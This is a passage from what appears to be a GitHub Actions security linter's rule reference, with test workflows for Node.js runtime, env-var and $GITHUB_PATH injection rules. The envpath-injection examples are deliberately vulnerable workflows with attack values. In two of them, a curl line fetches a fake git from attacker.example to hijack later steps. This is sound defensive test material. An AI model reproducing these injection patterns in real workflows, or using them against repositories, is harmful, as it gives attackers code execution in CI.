- remote-composite: a uses inside the action.yml of a composite action of another repository (a step of that composite action, not the uses that names the composite action) when action.definition has no answer for the composite action (a run without --online and without the answer in --facts, an answer of unknown, or an action deeper than the 4 levels of actions the linter reads): the rule reads the steps of a composite action of another repository only from the answer
  - finding kinds: deprecated-node-runtime.declared-runtime, deprecated-node-runtime.eol-node-version, deprecated-node-runtime.runtime-setting, deprecated-node-runtime.used-action
  - disposition: todo (needs: fact)
  - example: remote-composite.yml (workflow, undetected)
    ```yaml
    # situation: a workflow runs example-org/release-action@v1, a composite
    #   action of another repository, and a step of that composite action uses
    #   an action that declares runs.using: node20.
    # reason: the runner runs the inner action on Node.js 24, not on Node.js
    #   20, and adds a warning to the job.
    # cause: the rule reads the runs.using of the action that the workflow names
    #   (composite), and does not fetch the action.yml of a composite action of
    #   another repository to read the steps of the composite action.
    on: push
    permissions: {contents: write}
    jobs:
      release:
        runs-on: ubuntu-latest
        steps:
          - uses: example-org/release-action@v1
    ```
- outside-other-path: a uses whose path goes with .. above the root of its repository into the directory where the runner puts another uses' action, and names an action at another path there: the rule reads the other uses, not the action at that path
  - finding kinds: deprecated-node-runtime.declared-runtime, deprecated-node-runtime.eol-node-version, deprecated-node-runtime.runtime-setting, deprecated-node-runtime.used-action
  - disposition: todo (needs: same-file)
  - example: outside-other-path.yml (workflow, undetected)
    ```yaml
    # situation: the first step uses actions/cache/restore at the tag v3; the
    #   second step names actions/cache/restore by a full SHA, but its path goes
    #   with .. above the root of the repository, into the directory where the
    #   runner puts actions/cache at v3, and names the path save there.
    # reason: the second step runs actions/cache/save at v3, whose runs.using
    #   decides the Node.js version that the step asks for.
    # cause: for the second step, the rule reads the action of the first step
    #   (restore), not the action at the path of the second step (save).
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/cache/restore@v3
            with:
              path: build
              key: build
          - uses: actions/cache/restore/../../v3/save@0123456789012345678901234567890123456789
            with:
              path: build
              key: build
    ```
- node-version-alias: a node-version of actions/setup-node that is an alias (lts/hydrogen), a range (>=18) or a build that is not a release (16-nightly, canary), which may resolve to a version whose support ended: the version is chosen when the workflow runs, and the rule reads only a version (18, v18, 18.x)
  - finding kinds: deprecated-node-runtime.declared-runtime, deprecated-node-runtime.eol-node-version, deprecated-node-runtime.runtime-setting, deprecated-node-runtime.used-action
  - disposition: todo (needs: fact)
  - example: node-version-alias.yml (workflow, undetected)
    ```yaml
    # situation: a workflow sets up Node.js with node-version: lts/hydrogen, the
    #   alias of Node.js 18.
    # reason: the support of Node.js 18 ended on 2025-04-30, so the build runs
    #   on a Node.js version that no longer gets security fixes.
    # cause: the rule reads a node-version that is a version (18, v18, 18.x),
    #   and does not resolve an alias or a range to the version that
    #   actions/setup-node chooses when the workflow runs.
    on: push
    permissions: {contents: read}
    jobs:
      test:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/setup-node@v5
            with:
              node-version: lts/hydrogen
          - run: npm test
    ```
- node-version-expression: a node-version of actions/setup-node written as a \${{ }}, such as a variable of a matrix: the rule reads only a version written as it is
  - finding kinds: deprecated-node-runtime.declared-runtime, deprecated-node-runtime.eol-node-version, deprecated-node-runtime.runtime-setting, deprecated-node-runtime.used-action
  - disposition: todo (needs: same-file)
  - example: node-version-expression.yml (workflow, undetected)
    ```yaml
    # situation: a workflow tests a project on each Node.js version of a matrix,
    #   18 among them.
    # reason: the support of Node.js 18 ended on 2025-04-30, so the tests of
    #   that version run on a Node.js version that no longer gets security
    #   fixes.
    # cause: the rule reads a node-version written as it is, and does not read
    #   the values of the matrix that the ${{ }} names.
    on: push
    permissions: {contents: read}
    jobs:
      test:
        runs-on: ubuntu-latest
        strategy:
          matrix:
            node: [18, 24]
        steps:
          - uses: actions/setup-node@v5
            with:
              node-version: ${{ matrix.node }}
          - run: npm test
    ```
- node-version-file: a node-version-file of actions/setup-node, such as .nvmrc: the rule does not read the file
  - finding kinds: deprecated-node-runtime.declared-runtime, deprecated-node-runtime.eol-node-version, deprecated-node-runtime.runtime-setting, deprecated-node-runtime.used-action
  - disposition: todo (needs: repo-file)
  - example: node-version-file.yml (workflow, undetected)
    ```yaml
    # situation: a workflow sets up the Node.js version that the file .nvmrc of
    #   the repository names, and .nvmrc says 18.
    # reason: the support of Node.js 18 ended on 2025-04-30, so the build runs
    #   on a Node.js version that no longer gets security fixes.
    # cause: the rule does not read the file that node-version-file names.
    on: push
    permissions: {contents: read}
    jobs:
      test:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/setup-node@v5
            with:
              node-version-file: .nvmrc
          - run: npm test
    ```
- github-env: a setting of the Node.js version of actions written to \$GITHUB_ENV by a step (echo ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION=true >> \$GITHUB_ENV): the rule reads the keys of env only
  - finding kinds: deprecated-node-runtime.declared-runtime, deprecated-node-runtime.eol-node-version, deprecated-node-runtime.runtime-setting, deprecated-node-runtime.used-action
  - disposition: todo (needs: same-file)
  - example: github-env.yml (workflow, undetected)
    ```yaml
    # situation: a step writes ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION=true to
    #   $GITHUB_ENV, so the later steps of the job have the setting.
    # reason: GitHub-hosted runners do not obey the setting, so the setting does
    #   nothing there; on a runner that obeys the setting, the actions that
    #   declare node12, node16 or node20 run on Node.js 20, which no longer gets
    #   security fixes.
    # cause: the rule reads the keys of env of the workflow, the jobs and the
    #   steps, and does not read what a script writes to $GITHUB_ENV.
    on: push
    permissions: {contents: read}
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - run: echo "ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION=true" >> "$GITHUB_ENV"
          - run: make
    ```
- later-eol: a node-version of a major version of Node.js whose support ends after the table of the rule was written (2026-10-20): after the end of the support (Node.js 22: 2027-04-30), the rule does not report the node-version, since the table has only the major versions whose support had ended on 2026-10-20
  - finding kinds: deprecated-node-runtime.declared-runtime, deprecated-node-runtime.eol-node-version, deprecated-node-runtime.runtime-setting, deprecated-node-runtime.used-action
  - disposition: todo (needs: fact)
  - example: later-eol.yml (workflow, undetected)
    ```yaml
    # situation: a workflow builds and tests a project on Node.js 22, which is
    #   supported until 2027-04-30.
    # reason: from 2027-05-01, the build runs on a Node.js version that no
    #   longer gets security fixes.
    # cause: the rule has the table of the major versions whose support had
    #   ended on 2026-10-20, the day the table was written; Node.js 22 was
    #   still supported on that day, so Node.js 22 is not in the table.
    on: push
    permissions: {contents: read}
    jobs:
      test:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/setup-node@v5
            with:
              node-version: 22
          - run: npm test
    ```
- remote-callee: a job or a step inside a reusable workflow of another repository (uses: owner/repo/.github/workflows/&lt;file>@&lt;ref>) whose content the fact workflow.definition does not give. For every rule: a run that does not ask the fact (a run without --online and without the answer in --facts). For a quality rule, also: a run where the linter asked the fact and got no answer (an answer of unknown: the GitHub API did not give the file), and a call deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact. The rule reads a reusable workflow of another repository only from the answer of workflow.definition. For a rule that is not a quality rule (a rule with a threat), the last two forms are the inconclusive kind remote-callee-unknown, not this form
  - finding kinds: deprecated-node-runtime.declared-runtime, deprecated-node-runtime.eol-node-version, deprecated-node-runtime.runtime-setting, deprecated-node-runtime.used-action
  - disposition: todo (needs: fact)
  - example: remote-callee.yml (workflow, undetected)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/deprecated-node-runtime-unanswered, whose
    #   content is the workflow of the true positive eol-node-version
    #   (eol-node-version.yml) of the rule, with on: workflow_call in place of
    #   the on of eol-node-version.yml. The linter has no answer of the fact
    #   workflow.definition for the reusable workflow.
    # reason: a todo (a fact): the jobs of a reusable workflow run on the event
    #   that started the run of the calling job, and the linter does not read
    #   the reusable workflow.
    # cause: the rule reads a reusable workflow of another repository only from
    #   the answer of workflow.definition.
    on: push
    permissions: {}
    jobs:
      c:
        uses: example-org/deprecated-node-runtime-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

## env-var

- problem: a key of env has = in it, or names a variable that the runner writes in each step after the env of the step is set, with a value other than the value that the runner writes, so no step gets the variable with the name and the value as written
- expected: every key of env is a name without =, and is a name that the runner does not write in each step, or is written with the value that the runner writes
- targets: workflow, action-metadata
- quality rule: a finding of the quality rule alone gives no attacker a gain, and the findings of the quality rule set no bit of the exit code
- default run: always: in a run without --rule, the rule runs unless --skip-rule names the rule

### finding kinds

- env-var.equals-sign
  - detected: the env key {name} has =, which no name of an environment variable can have, and the runner sets the variable {variable} instead, to a value made from the rest of the key and the value written
  - arguments:
    - {name}: The key, as written.
    - {variable}: The part of the key before the first = of the key: the name of the variable that the runner sets instead.
  - consequence: no step gets a variable whose name is the key: the runner sets the variable named by the part of the key before its first = instead. For the key A=B with the value x, the value of A depends on where the key is written and where the step runs. For a key in the env of the workflow, a job or a step: a step on the runner gets A with the value B=x, and a step in the job's container gets A with the value B. For a key in container.env (the job's container) or in the env of a service container (services): the container gets A with the value B=x. For a key in runs.env of a Docker container action: the container of the action gets A with the value B
  - remedy: rename the key to a name without =, the name that the step reads
  - true positives:
    - equals-sign.docker.action.yml (action-metadata, true-positive)
      ```yaml
      # situation: a Docker container action sets runs.env with the key A=B.
      # reason: no name of an environment variable can have =: the container gets
      #   no variable A=B, and gets the variable A with the value B.
      name: scan
      description: scans the repository in a container
      runs:
        using: docker
        image: Dockerfile
        env:
          A=B: x
      ```
    - equals-sign.remote-callee.yml (workflow, true-positive)
      ```yaml
      # situation: a job calls the reusable workflow .github/workflows/w.yml of
      #   the repository example-org/env-var-remote, which the fact
      #   workflow.definition answers with the workflow of the true positive
      #   equals-sign (equals-sign.yml) of the rule, with on: workflow_call in
      #   place of the on of equals-sign.yml. The job passes its secrets with
      #   secrets: inherit. In the true positive, the job sets an env key
      #   DATABASE=URL, meant as the variable DATABASE_URL.
      # reason: the jobs of a reusable workflow run on the event that started the
      #   run of the calling job, so the reason of the true positive holds: no
      #   name of an environment variable can have =: the step gets no variable
      #   DATABASE_URL, and the runner sets the variable DATABASE to
      #   URL=postgres://db instead.
      on: push
      permissions: {contents: read}
      jobs:
        c:
          uses: example-org/env-var-remote/.github/workflows/w.yml@v1
          secrets: inherit
      ```
    - equals-sign.yml (workflow, true-positive)
      ```yaml
      # situation: the job sets an env key DATABASE=URL, meant as the variable
      #   DATABASE_URL.
      # reason: no name of an environment variable can have =: the step gets no
      #   variable DATABASE_URL, and the runner sets the variable DATABASE to
      #   URL=postgres://db instead.
      on: push
      permissions: {contents: read}
      jobs:
        test:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          env:
            DATABASE=URL: postgres://db
          steps:
            - run: ./test.sh
      ```
  - true negatives:
    - equals-sign.yml (workflow, true-negative)
      ```yaml
      # situation: the job sets env keys with a space and with &.
      # reason: GitHub accepts such names, and the step gets the variables as
      #   written, which a program reads by the names.
      on: push
      permissions: {contents: read}
      jobs:
        test:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          env:
            MY VAR: one
            A&B: two
          steps:
            - run: env
      ```
- env-var.runner-overwritten
  - detected: the env key {name} names a variable that the runner writes in each step after the env of the step is set: the runner writes the value of {runner_value} over the value written
  - arguments:
    - {name}: The key, as written.
    - {runner_value}: What the runner writes to the variable: the value of a context, written as \${{ github.sha }}, or the text true, for GITHUB_ACTIONS.
  - consequence: each step gets the value that the runner writes, not the value written in env; the log of the step shows the written value under env:, so the written value seems to reach the step. On a Windows runner, whose variables have no case, the same holds for the name in another case, such as github_sha; the rule reports such a name only in a job whose runs-on names a Windows runner
  - remedy: give the value a name that the runner does not write, and read that name in the step
  - true positives:
    - runner-overwritten.container.yml (workflow, true-positive)
      ```yaml
      # situation: the env of the job's container sets GITHUB_SHA.
      # reason: the runner passes its own GITHUB_SHA to each step in the
      #   container, so the steps get the commit of the run, not the value
      #   written.
      on: push
      permissions: {contents: read}
      jobs:
        test:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          container:
            image: node:24
            env:
              GITHUB_SHA: fixed
          steps:
            - run: npm test
      ```
    - runner-overwritten.yml (workflow, true-positive)
      ```yaml
      # situation: on pull_request, a step sets GITHUB_SHA to the head commit of
      #   the pull request, for a tool that reads GITHUB_SHA.
      # reason: the runner writes GITHUB_SHA in every step after env: the tool
      #   gets the merge commit of the run, not the head commit, though the log of
      #   the step shows the written value under env:.
      on: pull_request
      permissions: {contents: read}
      jobs:
        scan:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - env:
                GITHUB_SHA: ${{ github.event.pull_request.head.sha }}
              run: ./scan.sh
      ```
  - true negatives:
    - runner-overwritten.same-value.yml (workflow, true-negative)
      ```yaml
      # situation: the job sets GITHUB_REPOSITORY to ${{ github.repository }} and
      #   RUNNER_TEMP to ${{ runner.temp }}, for a tool that reads them.
      # reason: the runner writes the same values over the keys, so each step gets
      #   the values written.
      on: push
      permissions: {contents: read}
      jobs:
        build:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          env:
            GITHUB_REPOSITORY: ${{ github.repository }}
            RUNNER_TEMP: ${{ runner.temp }}
          steps:
            - run: ./build.sh
      ```
    - runner-overwritten.yml (workflow, true-negative)
      ```yaml
      # situation: a step sets CI, HOME and GITHUB_TOKEN in env.
      # reason: the runner does not write these variables after env, and the step
      #   gets the written values.
      on: push
      permissions: {contents: read}
      jobs:
        build:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - env:
                CI: "false"
                HOME: /tmp/home
                GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
              run: npm run build
      ```

### undetected forms

- expression-name: a key of env written with a \${{ }}, whose name is known when the workflow runs
  - finding kinds: env-var.equals-sign, env-var.runner-overwritten
  - disposition: limitation (decided by: run-time)
  - example: expression-name.yml (workflow, undetected)
    ```yaml
    # situation: the job sets an env key written with a ${{ }}, whose value is
    #   A=B.
    # reason: a limitation (run time): the key is known when the workflow runs,
    #   and has = in it.
    # cause: the rule does not read a key with a ${{ }}.
    on: push
    permissions: {contents: read}
    jobs:
      test:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        env:
          "${{ 'A=B' }}": x
        steps:
          - run: env
    ```
- expression-env: an env written as one \${{ }}, whose keys are known when the workflow runs
  - finding kinds: env-var.equals-sign, env-var.runner-overwritten
  - disposition: limitation (decided by: run-time)
  - example: expression-env.yml (workflow, undetected)
    ```yaml
    # situation: the job sets its env from a variable of the repository, as
    #   JSON.
    # reason: a limitation (run time): the keys are known when the workflow
    #   runs, and one of them may be GITHUB_SHA or have = in it.
    # cause: the rule reads the keys of an env written as a mapping.
    on: push
    permissions: {contents: read}
    jobs:
      test:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        env: ${{ fromJSON(vars.TEST_ENV) }}
        steps:
          - run: ./test.sh
    ```
- unknown-os-case: a key that names a variable the runner writes in another case (github_sha), in a job whose OS the runs-on does not decide, such as a \${{ }} of a matrix, or in runs.env or a step of an action.yml, whose caller decides the OS: on Windows the runner writes over the key, on Linux and macOS the key is another variable
  - finding kinds: env-var.equals-sign, env-var.runner-overwritten
  - disposition: todo (needs: same-file)
  - example: unknown-os-case.yml (workflow, undetected)
    ```yaml
    # situation: a job of a matrix of OSes sets the env key github_sha.
    # reason: a todo (the same file): on Windows, whose variables have no case,
    #   the runner writes over the key; on Linux and macOS the key is another
    #   variable.
    # cause: the runs-on is a ${{ }} of the matrix, and the rule does not read
    #   the OSes of the matrix.
    on: push
    permissions: {contents: read}
    jobs:
      test:
        strategy:
          matrix:
            os: [ubuntu-latest, windows-latest]
        runs-on: ${{ matrix.os }}
        timeout-minutes: 10
        env:
          github_sha: fixed
        steps:
          - run: ./test.sh
            shell: bash
    ```
- empty-name: a key of env that starts with =, such as =A: how the runner passes a key with an empty name before the = has not been tried
  - finding kinds: env-var.equals-sign, env-var.runner-overwritten
  - disposition: todo (needs: same-file)
  - example: empty-name.yml (workflow, undetected)
    ```yaml
    # situation: the job sets an env key =A, with no name before the =.
    # reason: a todo (the same file): no name of an environment variable can be
    #   empty, and the step does not get the variable as the key is written.
    # cause: the rule reports a key with = by the name before the first =, and
    #   the name before the = of =A is empty; how the runner passes the key has
    #   not been tried.
    on: push
    permissions: {contents: read}
    jobs:
      test:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        env:
          =A: x
        steps:
          - run: env
    ```
- remote-callee: a job or a step inside a reusable workflow of another repository (uses: owner/repo/.github/workflows/&lt;file>@&lt;ref>) whose content the fact workflow.definition does not give. For every rule: a run that does not ask the fact (a run without --online and without the answer in --facts). For a quality rule, also: a run where the linter asked the fact and got no answer (an answer of unknown: the GitHub API did not give the file), and a call deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact. The rule reads a reusable workflow of another repository only from the answer of workflow.definition. For a rule that is not a quality rule (a rule with a threat), the last two forms are the inconclusive kind remote-callee-unknown, not this form
  - finding kinds: env-var.equals-sign, env-var.runner-overwritten
  - disposition: todo (needs: fact)
  - example: remote-callee.yml (workflow, undetected)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/env-var-unanswered, whose content is the
    #   workflow of the true positive equals-sign (equals-sign.yml) of the rule,
    #   with on: workflow_call in place of the on of equals-sign.yml. The linter
    #   has no answer of the fact workflow.definition for the reusable workflow.
    # reason: a todo (a fact): the jobs of a reusable workflow run on the event
    #   that started the run of the calling job, and the linter does not read
    #   the reusable workflow.
    # cause: the rule reads a reusable workflow of another repository only from
    #   the answer of workflow.definition.
    on: push
    permissions: {}
    jobs:
      c:
        uses: example-org/env-var-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

## envpath-injection

- problem: a value an attacker controls is written to \$GITHUB_PATH, whose lines are directories put before the PATH of the steps after it
- expected: no value an attacker controls is written to \$GITHUB_PATH
- severity: high (the worst of its kinds)
- targets: workflow, action-metadata
- facets:
  - weakness: environment-file-injection
  - attack-means: string
- default run: always: in a run without --rule, the rule runs unless --skip-rule names the rule

### finding kinds

- envpath-injection.controlled
  - detected: {expr_ref} is written to \$GITHUB_PATH, and an attacker who controls it on {controlled_on} chooses a directory of the PATH of the steps after it
  - arguments:
    - {expr_ref}: The reference as written: a context in \${{ }}, such as github.event.issue.title, or a variable of env, such as \$TITLE.
    - {controlled_on}: The events on which an attacker controls the value of the expression, each event named once.
  - consequence: an executable of the attacker's in that directory runs for a command the steps after it call by name, and as the shell of their run steps
  - remedy: write a fixed path, not one made of the value: no part of the line may be the attacker's
  - severity: high (found from the CVSS metrics below by the table)
  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
  - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks
  - preconditions: runner-reads-path, path-lookup, attacker-executable, attacker-writes, attacker-event, callers-events, app-status-check
  - true positives:
    - controlled.default-assignment.yml (workflow, true-positive)
      ```yaml
      # situation: on issues opened, a step sets out to $GITHUB_PATH with the operator
      #   := of a parameter expansion, and writes $V to "$out".
      # reason: bash assigns $GITHUB_PATH to out, which is
      #   unset, so the value goes to $GITHUB_PATH.
      # attack-value: github.event.issue.title = "/tmp/PWNED"
      # attack-run-behavior: the value goes to $GITHUB_PATH.
      on:
        issues:
          types: [opened]
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - env:
                V: ${{ github.event.issue.title }}
              run: |
                : "${out:=$GITHUB_PATH}"
                echo "$V" >> "$out"
      ```
    - controlled.descriptor-per-path.yml (workflow, true-positive)
      ```yaml
      # situation: on issues opened, a step opens descriptor 3 on $GITHUB_PATH
      #   when QUIET is empty and on /dev/null otherwise, and writes $V to
      #   descriptor 3.
      # reason: QUIET is not set in the step, so bash runs the branch that
      #   opens descriptor 3 on $GITHUB_PATH, and the value goes to $GITHUB_PATH.
      # attack-value: github.event.issue.title = "/tmp/PWNED"
      # attack-run-behavior: the value goes to $GITHUB_PATH.
      on:
        issues:
          types: [opened]
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - env:
                V: ${{ github.event.issue.title }}
              run: |
                if [ -z "$QUIET" ]; then exec 3>>"$GITHUB_PATH"; else exec 3>/dev/null; fi
                echo "$V" >&3
      ```
    - controlled.jump-path.yml (workflow, true-positive)
      ```yaml
      # situation: on issues opened, a step sets out to /dev/null; in a for loop,
      #   the step sets out to $GITHUB_PATH, leaves the loop with break when STOP
      #   is empty, and sets out to /dev/null after the break; after the loop,
      #   the step writes the issue's title to "$out"; the next step runs git
      #   status.
      # reason: STOP is not set in the step, so the
      #   loop ends at the break with out holding $GITHUB_PATH, and the title
      #   goes to $GITHUB_PATH.
      # attack-value: github.event.issue.title = "/tmp/PWNED"
      # attack-run-behavior: the value goes to $GITHUB_PATH.
      on:
        issues:
          types: [opened]
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - env:
                V: ${{ github.event.issue.title }}
              run: |
                out=/dev/null
                for i in 1 2; do out=$GITHUB_PATH; [ -z "$STOP" ] && break; out=/dev/null; done
                echo "$V" >> "$out"
            - run: git status
      ```
    - controlled.no-caller.action.yml (action-metadata, true-positive)
      ```yaml
      # situation: a composite action with no caller among the files that the
      #   linter reads; a step downloads the file the body of an issue links to
      #   /tmp/t/git, makes the file executable, and writes the body to
      #   $GITHUB_PATH; the next step runs git status.
      # reason: with no caller among the files that the linter reads, the rule
      #   reads the action on every event an attacker triggers, issues among the
      #   events. The runner adds each line written to $GITHUB_PATH to the front of
      #   PATH for the steps after the step, so a body with the line /tmp/t puts
      #   that directory first, and git status runs the attacker's /tmp/t/git
      #   instead of the system's git.
      # attack-value: github.event.issue.body = "https://attacker.example/git\n/tmp/t\n/tmp/PWNED"
      # attack-run-behavior: BODY holds three lines; mkdir makes /tmp/t, curl
      #   saves the file at https://attacker.example/git as /tmp/t/git, chmod makes
      #   the file executable, and echo writes the lines
      #   https://attacker.example/git, /tmp/t and /tmp/PWNED to $GITHUB_PATH. The
      #   PATH of the next step starts with /tmp/PWNED and /tmp/t (the line written
      #   last comes first), then the line of the URL, and git status runs
      #   /tmp/t/git, the attacker's file.
      name: fetch tool
      description: fetch the tool the issue links to
      runs:
        using: composite
        steps:
          - env:
              BODY: ${{ github.event.issue.body }}
            run: |
              mkdir -p /tmp/t && curl -sLo /tmp/t/git "$(echo "$BODY" | grep -o 'https://[^ ]*' | head -n1)" && chmod +x /tmp/t/git
              echo "$BODY" >> "$GITHUB_PATH"
            shell: bash
          - run: git status
            shell: bash
      ```
    - controlled.post-step.yml (workflow, true-positive)
      ```yaml
      # situation: on issues opened, a job checks out the repository, and its last
      #   step writes the body of the issue to $GITHUB_PATH.
      # reason: the post step of actions/checkout runs after the last step with
      #   that PATH, and runs git: a body whose lines include a directory that
      #   holds the attacker's git makes the post step run the attacker's git.
      # attack-value: github.event.issue.body = "/tmp/PWNED"
      # attack-run-behavior: echo writes /tmp/PWNED to $GITHUB_PATH; the post
      #   step of actions/checkout looks up git in a PATH that starts with
      #   /tmp/PWNED. On 2026-10-22, on ubuntu-latest, the post step ran the git
      #   and the sed of such a directory.
      on:
        issues:
          types: [opened]
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
            - env:
                BODY: ${{ github.event.issue.body }}
              run: echo "$BODY" >> "$GITHUB_PATH"
      ```
    - controlled.remote-callee.yml (workflow, true-positive)
      ```yaml
      # situation: a job calls the reusable workflow .github/workflows/w.yml of
      #   the repository example-org/envpath-injection-remote, which the fact
      #   workflow.definition answers with the workflow of the true positive
      #   controlled (controlled.default-assignment.yml) of the rule, with on:
      #   workflow_call in place of the on of controlled.default-assignment.yml.
      #   The job passes its secrets with secrets: inherit. In the true positive,
      #   on issues opened, a step sets out to $GITHUB_PATH with the operator :=
      #   of a parameter expansion, and writes $V to "$out".
      # reason: the jobs of a reusable workflow run on the event that started the
      #   run of the calling job, so the reason of the true positive holds: bash
      #   assigns $GITHUB_PATH to out, which is unset, so the value goes to
      #   $GITHUB_PATH.
      # attack-value: github.event.issue.title = "/tmp/PWNED"
      # attack-run-behavior: the value goes to $GITHUB_PATH.
      on:
        issues:
          types: [opened]
      jobs:
        c:
          uses: example-org/envpath-injection-remote/.github/workflows/w.yml@v1
          secrets: inherit
      ```
    - controlled.skipped-assignment.yml (workflow, true-positive)
      ```yaml
      # situation: on issues opened, a step sets out to $GITHUB_PATH, defines a
      #   function f that sets out to /dev/null only when Q is set, calls f, and
      #   writes the issue's title to "$out"; the next step runs git status.
      # reason: Q is not set in the step, so f is not
      #   defined, the call fails, out holds $GITHUB_PATH, and the title goes to
      #   $GITHUB_PATH.
      # attack-value: github.event.issue.title = "/tmp/PWNED"
      # attack-run-behavior: the value goes to $GITHUB_PATH.
      on:
        issues:
          types: [opened]
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - env:
                V: ${{ github.event.issue.title }}
              run: |
                out=$GITHUB_PATH
                if [ -n "$Q" ]; then f() { out=/dev/null; }; fi
                f
                echo "$V" >> "$out"
            - run: git status
      ```
    - controlled.status-commit.yml (workflow, true-positive)
      ```yaml
      # situation: on status, which an app outside GitHub Actions starts when the
      #   app writes a status for a commit, the job writes the message of the
      #   commit of the status (github.event.commit.commit.message) into
      #   $GITHUB_PATH.
      # reason: an outside CI that writes a status for a commit of a pull request
      #   from a fork starts a run of status on the default branch, with the
      #   message of that commit, which the author of the pull request writes, in
      #   the payload (seen on GitHub).
      # attack-value: github.event.commit.commit.message = "a\n/tmp/PWNED"
      # attack-run-behavior: an outside CI writes a status for the commit of the
      #   pull request from a fork whose message is the value; the run of status
      #   starts on the default branch, echo writes the lines a and /tmp/PWNED to
      #   $GITHUB_PATH, and the runner puts /tmp/PWNED first in the PATH of the
      #   steps after it.
      on: status
      jobs:
        j:
          runs-on: ubuntu-latest
          steps:
            - run: echo "${{ github.event.commit.commit.message }}" >> "$GITHUB_PATH"
      ```
    - controlled.yml (workflow, true-positive)
      ```yaml
      # situation: on issues opened, a step downloads the file the issue's body
      #   links to /tmp/t/git, makes it executable, and writes the body to
      #   $GITHUB_PATH; the next step runs git status.
      # reason: the runner adds each line written to $GITHUB_PATH to the front of
      #   PATH for the steps after it, so a body with the line /tmp/t puts that
      #   directory first, and git status runs the attacker's /tmp/t/git instead
      #   of the system's git.
      # attack-value: github.event.issue.body = "https://attacker.example/git\n/tmp/t\n/tmp/PWNED"
      # attack-run-behavior: BODY holds three lines; mkdir makes /tmp/t, curl
      #   saves the file at https://attacker.example/git as /tmp/t/git, chmod
      #   makes it executable, and echo writes the lines
      #   https://attacker.example/git, /tmp/t and /tmp/PWNED to $GITHUB_PATH. The
      #   next step's PATH starts with /tmp/PWNED and /tmp/t (the line written
      #   last comes first), then the line of the URL, and git status runs
      #   /tmp/t/git, the attacker's file.
      on:
        issues:
          types: [opened]
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - env:
                BODY: ${{ github.event.issue.body }}
              run: |
                mkdir -p /tmp/t && curl -sLo /tmp/t/git "$(echo "$BODY" | grep -o 'https://[^ ]*' | head -n1)" && chmod +x /tmp/t/git
                echo "$BODY" >> "$GITHUB_PATH"
            - run: git status
      ```
  - true negatives:
    - controlled.background-exec.yml (workflow, true-negative)
      ```yaml
      # situation: on issues opened, a step runs exec 3>> "$GITHUB_PATH" in the
      #   background, waits for it, and writes the issue's title to
      ```
